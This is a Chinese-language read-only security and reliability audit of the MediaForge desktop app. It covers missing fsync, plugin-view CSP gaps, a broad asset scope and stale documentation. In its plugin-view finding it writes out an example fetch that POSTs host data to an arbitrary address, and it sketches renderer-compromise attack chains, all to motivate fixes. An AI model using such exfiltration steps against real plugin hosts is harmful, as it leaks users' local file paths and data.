# MediaForge 只读代码审查报告

| 项 | 内容 |
|---|---|
| 审查对象 | MediaForge（Tauri 2 + Vue 3 + Python worker 的本地多模态媒体工作站） |
| 代码基线 | `d5d4654` `docs: record the r2 candidate built after the invoke refactor`，分支 `codex/release-readiness-0.0.32`，工作区干净 |
| 审查日期 | 2026-11-12 |
| 性质 | **只读**。未修改任何被审文件、未运行测试/构建/安装器、未启动 GUI |
| 方法 | 通读 `AGENTS.md` / `DEVELOPMENT.md` / `memory.md`（§1–4、§11、§13–18、§85–88）/ `docs/*`，再逐文件读 Rust、Python、TS 的关键路径，最后拿文档结论与代码逐条对账 |
| 结论分级 | **P1** 发布前应修 · **P2** 应记录并排期 · **P3** 文档/记忆腐化 · **已排除** 查过没问题 · **未验证** 不能当结论 |

---

## 1. 执行摘要

这个项目的工程质量明显高于同规模个人项目。账本单一真源、跨进程锁序、原子替换、ZIP 拒绝路径穿越与符号链接、minisign 验签、增量信封、跨进程配额——这些不是文档里写了而已，而是逐条能对上代码的。

剩下的问题集中在四个地方：**耐久性承诺与实现不一致**、**渲染层与插件层权限放得太宽**、**数据根位置依赖隐含假设**、**记忆与 README 已落后于代码**。

| # | 级别 | 主题 | 关键证据 | 状态 |
|---|---|---|---|---|
| 1 | **P1** | Python 账本写入无 `fsync`，但文档承诺 durable | `python/core/operation_kernel.py:4-5` vs `:71-78` | 代码可证 |
| 2 | **P1** | 插件视图文档无 CSP 且带 `allow-forms`，构成数据外发通道 | `src-tauri/src/plugin_views.rs:20-27`、`PluginViewHost.vue:209` | 代码可证 |
| 3 | P2 | `assetProtocol.scope` 含 `"**"`，等于把全盘交给渲染层 | `src-tauri/tauri.conf.json:27-34` | 代码可证 |
| 4 | P2 | `move_paths_to_trash` 无根目录白名单 | `src-tauri/src/commands/app/trash.rs:77` | 代码可证 |
| 5 | P2 | 数据根在安装目录旁，与 README 承诺相反 | `storage.rs:70-93`、`mediaforge.iss:18,25` | 设计假设 |
| 6 | P2 | MCP 桥 token 明文落盘 + 非常量时间比较 | `python/agent_bridge.py:762,833-847` | 代码可证 |
| 7 | **P3** | `memory.md` §17 已过期（记「未修」，实际已修） | `storage.rs:59`、`release-windows.yml:135` | 已核实 |
| 8 | P3 | README 四处与代码矛盾 | `README.zh-CN.md:15,23,92,186` | 已核实 |

---

## 2. P1 — 发布前应修

### 2.1 Python 侧账本写入没有 `fsync`，而模块自己承诺 durable

**证据**

`python/core/operation_kernel.py:4-5`（模块 docstring）：

> Progress writes are throttled; **status changes and terminal payloads are durable immediately**.

`:71-78` 的实现：

```python
def _atomic_write(path: Path, text: str) -> None:
    # Writers publish a whole job snapshot with one atomic replacement.
    temporary = path.with_name(f".{path.name}.{uuid.uuid4().hex}.tmp")
    try:
        temporary.write_text(text, encoding="utf-8")   # 只到 OS page cache
        temporary.replace(path)                        # 只保证命名空间原子
    finally:
        temporary.unlink(missing_ok=True)
```

对照 Rust 侧 `src-tauri/src/storage.rs:539`（以及 `:704`）：`file.write_all(&content)?` 之后有 `file.sync_all()?`，再走 `ReplaceFileW` / `rename`。

**同一份契约，两套实现，一套落地，一套没落地。** Python 是全部 5 处写入的唯一入口（`:326` 认领、`:390` 恢复、`:465`、`:851` 取消、`_persist`），所以这条缝覆盖所有由 kernel 写的作业。

**后果**

不是「丢一点进度」，而是断电/蓝屏后可能出现 **0 字节或被截断的 job 文件**。`job_store.validate_record` 会判定它损坏；读取端虽然不会因为坏文件阻塞启动，但这个作业会从账本里**消失**，而它的输出文件仍留在 `outputs/` 变成孤儿。用户侧表现是「已经点了开始、UI 也收到 ACK 的作业，重启后不存在了」。

`replace` 只保证「要么旧文件、要么新文件」被看到，不保证新文件的内容已经落到盘上。

**修法**

写入走 `open(..., 'w')` 拿 fd，`write` + `os.fsync(fd)` 后再 `replace`。Windows 不支持目录 fsync，忽略即可。十行以内。

**备注**：`finally: temporary.unlink(missing_ok=True)` 在成功路径上是 no-op，不是缺陷；只有 `write_text` 中途失败时才起清理作用。

---

### 2.2 插件视图文档没有 CSP，却带 `allow-forms`

**证据**

- `src-tauri/src/plugin_views.rs:20-27`，所有响应的头只有三个：

  ```rust
  .header("Content-Type", mime)
  .header("Access-Control-Allow-Origin", "*")
  .header("Cache-Control", "no-cache")
  ```

  **没有 `Content-Security-Policy`**。

- `src/features/plugin-marketplace/PluginViewHost.vue:209`：`sandbox="allow-scripts allow-forms"`。

**为什么这是真通道**

父文档的 `form-action 'self'` 只约束父文档，**不约束 iframe 内的子文档**——每个文档用各自的策略，而这个子文档没有策略。所以一个装进来的恶意插件视图可以：

1. `fetch('https://任意地址', { method: 'POST', body: 宿主发来的 payload })` —— CORS 不拦「发送」，只拦「读取响应」；
2. 或直接用 `allow-forms` 提交表单把数据带出去。

宿主确实会通过 `postMessage` 向插件送 `operations.start` 的 payload，其中含本地素材的绝对路径。

**结论：装插件的语义等于「授予网络外发权 + 本地路径可见权」**，而安装时没有任何提示。这是本项目中唯一一条**不需要攻破任何东西**、只需用户装一个插件即可成立的外发通道。

**顺带两处**

- `Access-Control-Allow-Origin: *` 对 sandbox 的 opaque origin 毫无必要（同源请求不需要 CORS）。更糟的是 `plugin_views.rs:327` 与 `:346` 的测试把这个行为**断言成了正确行为**，等于把缺陷锁死。建议改成 `null` 或直接不加，并同步改测试。
- 宿主 `postMessage(..., '*')`：因为 frame 是 opaque origin，`'*'` 在技术上无可避免；但 frame 可以**自导航**到远程页（自身导航不需要 `allow-top-navigation`），此后宿主发出的消息会落到恶意页面手上。`event.source === frameWindow` 只挡住「收」，挡不住「发」。缓解办法是消息体里不放绝对路径，只传 id 由宿主侧解析。

**修法（推荐）**

给 `plugin_views.rs` 的响应加最小 CSP：

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; media-src 'self' data: blob:;
connect-src 'none'; form-action 'none'; base-uri 'none'
```

如果个别插件确实需要联网，用插件清单里的权限位按需放开 `connect-src`，而不是全体默认放开。这样一条头就能把整条通道掐死，且不需要改动插件模型。

---

## 3. P2 — 应记录并排期

### 3.1 `assetProtocol.scope` 里有 `"**"`，前两条是安慰剂

`src-tauri/tauri.conf.json:27-34`：

```json
"assetProtocol": {
  "enable": true,
  "scope": ["$APPDATA/**", "$HOME/.pymss-studio/**", "**"]
}
```

`"**"` 覆盖一切，前两条不产生任何限制；而 `$HOME/.pymss-studio/**` 这个名字本身已经过时（代码用的是 `.mediaforge`）。

任何渲染层被攻破的路径，都能用 `convertFileSrc(任意路径)` 把用户磁盘上的文件当资源读出来，并配合 `img-src asset:` 直接渲染进页面。目前唯一在挡外发的是 CSP 的 `connect-src`（只允许 self/ipc/asset），这是**摩擦，不是边界**。

`docs/handoff-2026-11-08.md` 已把它列为未完成的 P2，说明是**有意保留**。建议至少写清「为什么现在必须是 `**`」，以及收窄的目标范围（outputs / models / thumbnails / editor-projects + 用户经 dialog 显式选择的路径，用 Tauri 的动态 scope 扩展）。

### 3.2 `move_paths_to_trash` 接受任意路径

`src-tauri/src/commands/app/trash.rs:77`：

```rust
pub async fn move_paths_to_trash(paths: Vec<String>, empty_dirs: Option<Vec<String>>) -> AppResult<TrashResult>
```

直接把 renderer 传来的字符串列表送进回收站，**没有根目录白名单**。项目里已经有 `result_protection`（`src-tauri/src/commands/app/tasks.rs`）这种「受保护根」的成熟模式，回收站这条路径没有复用。

结合 3.1，攻击链是完整的：渲染层沦陷 → 读全盘 → 清空文档目录。好在回收站可恢复，属于「可恢复的破坏」而非不可逆，所以定 P2 而非 P1。

建议：限定在 `data_root` / `outputs` / `editor-projects` / 用户经 dialog 选择过的路径（dialog 返回值入白名单）。

### 3.3 数据根在安装目录旁边，与 README 承诺相反

**事实**

- `src-tauri/src/storage.rs:70-93`：安装版数据根 = `<exe 目录>/../data`，便携版 = `<exe 目录>/data`。
- `installer/mediaforge.iss:18,25`：`PrivilegesRequired=lowest` + `DefaultDirName={localappdata}\Programs\MediaForge`。

所以实际数据落在 `%LOCALAPPDATA%\Programs\MediaForge\data`。

**为什么是问题**

1. 权限没问题（LocalAppData 可写），但**用户的心智模型是错的**：`README.zh-CN.md:23` 说数据固定在 `C:\Users\<你>\.mediaforge`，卸载不删模型。实际任务账本、素材库、输出全在 `...\Programs\MediaForge\data`。用户或清理软件把这个目录当「程序目录」删掉，数据就没了，而他以为安全。
2. `installed_layout_for` 被 `#[cfg(windows)]` 包着（`storage.rs:118-121`），macOS 走 `legacy_data_root_dir`。**现在是对的**，但这是一个埋在 `cfg` 里的平台假设：哪天有人给 macOS 打开这条路，`/Applications` 不可写会导致直接启动失败。

### 3.4 MCP 桥的 token 处理

`python/agent_bridge.py`：

- `:762` `return self.headers.get("Authorization") == expected` —— 非常量时间比较。
- `:833-847` 支持 `--no-auth`，并把 token 明文写进 `<data_root>/mcp-bridge.json`。

只绑 `127.0.0.1`，攻击面仅限本机其它进程/用户。建议换 `secrets.compare_digest`，并在 POSIX 上给配对文件设 `0600`。另：`/health` 未鉴权是合理的（探活），保持即可。

---

## 4. P3 — 文档与记忆已腐化

这一节的成本最高，因为它影响的是**下一个接手的人**。

| 位置 | 文档写的 | 代码实际 |
|---|---|---|
| `memory.md` §17（整节） | 便携版标记名两套（`mediaforge.portable` vs `pymss-studio.portable`）、`storage.rs` 的便携分支是**死分支**、"未修，这是产品决策" | **已修**：`storage.rs:59` 与 `release-windows.yml:135/293/437/592` 统一为 `mediaforge.portable`；`update_manager.rs` 已不存在于 `src-tauri/src/` |
| `memory.md` §16.2 | "`tauri.conf.json` 的 `updater.endpoints` 还是 `[]`，自动更新是死的" | `tauri.conf.json` 里**根本没有 `plugins` 段**；`docs/install-state.md:179` 明说第一版不做自动更新——**这是决策，不是缺陷** |
| `README.zh-CN.md:23` | 数据固定在 `C:\Users\<你>\.mediaforge` | 安装版在 `<install>/data`（`storage.rs:70-93`） |
| `README.zh-CN.md:92` | SQLite 索引默认 `%APPDATA%/MediaForge/library.db` | 在 `<data_root>/library.db` |
| `README.zh-CN.md:186` | "读取 `agent-jobs/index.json` 和 `agent-workspace.json`" | 两者已废弃，`task_journal.rs` 还**专门跳过** `index.json` |
| `README.zh-CN.md:15` | 便携版是 `.zip` | Release 产出的制品是 `.7z` |
| `docs/release-checklist.md:142` | "`plugins.updater.endpoints` 目前是空数组（`[]`）" | 同上，配置段整体不存在 |

**根因不是谁偷懒，而是 `memory.md` 没有任何过期机制。**

它现在 5265 行、88 节，按时间追加，从不回改。§17 明确写着「未修」，而它早就被修掉了。下一次接手的人如果照 §17 决策，会去修一个不存在的问题——记忆在这里不是资产，是负债。

建议的最小机制（不改历史内容，只加覆盖层）：

- 在被推翻的节标题上方加一行 `> ⚠️ 已过期（2026-XX-XX）：实际状态见 §NN`，保留原文作为决策史。
- 在 `memory.md` 顶部维护一个「当前事实速查表」：数据根、便携标记名、schema 版本、是否启用自动更新、运行时 assetId。**只允许改这张表，不允许追加第二张。**
- `README` 的四处数据根描述改成与 `DEVELOPMENT.md` 一致，或直接指向 `DEVELOPMENT.md`。

README 那几行属于「用户按文档去操作，然后找不到文件」级别，比内部注释错更贵。

---

## 5. 已排除的怀疑

以下是我一开始标记为可疑、读代码后确认**没有问题**的项。列出来避免重复劳动。

| 疑点 | 结论 |
|---|---|
| 配额 `try_acquire` 是「探测—释放—再计数」，存在竞态窗口 | **设计正确，我最初读错了。** `execution_quota.rs:89-103` 在计数期间**持有所有空闲槽**，数完才 `into_iter().next()` 留下一个、释放其余。并发探测者拿不到任何槽，计数因此是原子的。`:87-88` 的注释也写明了「caller holds the job catalog lock」这一前置条件 |
| 锁文件可能被误删，导致互斥失效 | 不会。两侧都**从不 unlink** 锁文件 |
| Rust / Python 锁序可能不一致 | 一致：`catalog → quota → owner → write`（`task_journal.rs` 与 `operation_kernel.py` 对齐） |
| ZIP 解包可能被路径穿越或符号链接逃逸 | 已防：`enclosed_name` + 显式拒绝符号链接条目（`runtime_assets.rs`） |
| 版本清单可能被中间人篡改 | 已防：内嵌 minisign 公钥 + schemaVersion 2 严格校验 + 签名缓存（`version_check.rs`） |
| 素材库读取可能写坏用户的 `library.db` | 不会：`READONLY \| NOMUTEX`、严格校验 `sqlite_master`、拒相对路径/NUL/BOM/侧车文件、非 Windows 直接拒绝 |
| 插件 iframe 可能直接调用 Tauri IPC | 不会：没有 `allow-same-origin`，拿不到 `__TAURI_INTERNALS__`；`operations` 家族只暴露 `describe` / `start` 两个方法（`PluginViewHost.vue:40-45,62-64`） |
| 任务历史增量合并可能「删除复活」或「陈旧倒退」 | 已处理：前端按 `updatedAt` 拒陈旧、`removed` 只对非 pending 生效、合并后重做音频组闭包校验 |
| Python worker 崩溃会留下永远 running 的作业 | 已处理：`_recover_from_disk` 把遗留 `queued`/`running` 标 `interrupted` |
| 插件视图可越权读别的插件文件 | 已防：`canonicalize` + `starts_with(base)`，id 限 `[A-Za-z0-9._-]` 且不以 `.` 开头，有符号链接逃逸测试 |

---

## 6. 未验证 — 不能当结论使用

1. **3.79 GB 运行时资产的线上可下载性。** `manifest/runtime.json` 的 hf-mirror URL 早前出现过 404；`memory.md` §86 自述「未发布，线上是否已可用没有核验」。这是发布链上最可能当天炸的一环，需要有限 HEAD/Range 探测，不要重下整个资产。
2. **非 Windows 上素材库引用检查。** `src-tauri/src/python/library_references.rs:127` 直接返回 `Err("precise SQLite reference reading is currently unsupported on this platform")`。memory 说「当前保守拒绝」，我确认了它返回错误，但**没有逐条追完 `Err` 在删除预检里的传播**。如果哪条路径把 `Err` 当成「没有引用」，跨平台就会误删。建议自查所有调用点对 `Err` 的处理语义。
3. **插件安装是否校验签名/哈希。** 在 `commands/plugin_host.rs` 里没找到（那是原生音频宿主，不是市场）。市场安装逻辑在别处，**未见校验**，但不下「不存在」的判断。
4. **签名 / 公证链路、macOS/Linux 原生包、GPU 全模型矩阵。** 均未验收，`memory.md` §86 已如实记录。
5. **完整 GUI 行为。** 用户明确禁止桌面操作，所有界面结论均来自代码与测试断言，不是实测。

---

## 7. 建议顺序

### 发布前（成本低、收益明确）

1. `operation_kernel._atomic_write` 加 `fsync` —— 十行以内，堵住唯一会丢已确认数据的洞。
2. `plugin_views` 加最小 CSP（`connect-src 'none'; form-action 'none'`）—— 一条头掐死唯一的外发通道；顺手把 `ACAO` 从 `*` 改成 `null` 并同步改两个测试断言。
3. `memory.md` §16.2 / §17 加过期标记，`README` 四处数据根描述改对。

### 发布后第一批

4. `assetProtocol.scope` 从 `**` 收到具体根 + 动态扩展；同步删掉过时的 `$HOME/.pymss-studio/**`。
5. `move_paths_to_trash` 复用 `result_protection` 的白名单模式。
6. `agent_bridge` 用 `secrets.compare_digest`，配对文件 `0600`。

### 结构性（不急于一时，但要记录）

7. 两套账本实现（`task_journal.rs` / `job_store.py`）短期不必合并，但需要一份**双向契约校验脚本**：任一侧加字段必须让另一侧红。现在只有命令面与架构的对账，没有账本字段的对账。
8. 数据根位置要么真正搬回用户目录，要么把「装在 LocalAppData、数据在程序旁、卸载保留 data」写进 README 的显著位置——现在这三件事读者无法从文档推出来。

---

## 附录 A · 核对过的关键文件

Rust：`main.rs`、`storage.rs`、`plugin_views.rs`、`version_check.rs`、`runtime_assets.rs` / `runtime_assets/transaction.rs`、`python/task_journal.rs`、`python/execution_quota.rs`、`python/library_references.rs`、`commands/app/tasks.rs`、`commands/app/trash.rs`、`commands/plugin_host.rs`

Python：`worker.py`、`agent_bridge.py`、`core/operation_kernel.py`、`core/job_store.py`、`core/job_quota.py`、`core/worker_runtime_lock.py`

前端：`stores/mediaJobs.ts`、`features/plugin-marketplace/PluginViewHost.vue`、`viewUrl.ts`、`api/native.ts`

配置与流程：`tauri.conf.json`、`capabilities/main.json`、`manifest/protocol.json`、`manifest/execution-quota.json`、`manifest/runtime.json`、`installer/mediaforge.iss`、`.github/workflows/ci.yml`、`.github/workflows/release-windows.yml`、`.gitignore`

文档：`AGENTS.md`、`DEVELOPMENT.md`、`memory.md`（§1-4、§11、§13-18、§85-88）、`docs/architecture-blueprint.md`、`docs/architecture-status.md`、`docs/job-ledger-contract.md`、`docs/handoff-2026-11-08.md`、`docs/release-checklist.md`、`docs/install-state.md`、`README.zh-CN.md`

## 附录 B · 关键不变量速查

给接手的人用，全部已对照代码核实：

- **账本**：唯一真源是 `<data-root>/agent-jobs/<jobId>.json`，schema 2，无 `index.json`、无 `agent-workspace.json`、无 workspace 副本。列表与 UI 都是内存投影。
- **锁序**：`catalog → quota → owner → write`；另一条独立链 `catalog → owner/write → JSON → model → asset`。锁文件永不 unlink。
- **锁实现**：Rust `FileLock` = Windows `share_mode(0)` / Unix `flock`；Python `runtime_lock` = `msvcrt.locking` / `fcntl.flock`。锁忙时抛 `RuntimeLockBusy`（是 `RuntimeError`，不是 `OSError`）。
- **原子写**：Rust 有 `sync_all` + `ReplaceFileW`（重试 1176/1177）；Python **没有** fsync —— 见 §2.1。
- **配额**：`manifest/execution-quota.json`，默认 1、上限 4，设置键 `maxConcurrentSeparations`；按数据根共享，执行器内部 FIFO。**没有**跨进程全局 FIFO，也没有 GPU 物理分区。
- **增量信封**：`schemaVersion 3` = `{schemaVersion, full, jobs, removed, dataRoot, jobsDir}`；带 `known` 时只回变化项。
- **运行时**：manifest 声明描述符 → SHA-256 校验 → staging 目录 → rename 发布 → 指针回滚（`active-runtime.json`）→ `.runtime-lease.lock` 独占。
- **便携标记**：`mediaforge.portable`（`storage.rs:59`，与 CI 一致）。
- **数据根优先级**：`MEDIAFORGE_DATA_ROOT` / `MEDIAFORGE_DATA_DIR` / `PYMSS_STUDIO_DATA_ROOT` → 开发态 `.dev-data` → 便携版 `<exe>/data` → 安装版 `<install>/data` → 兜底 `~/.mediaforge`。
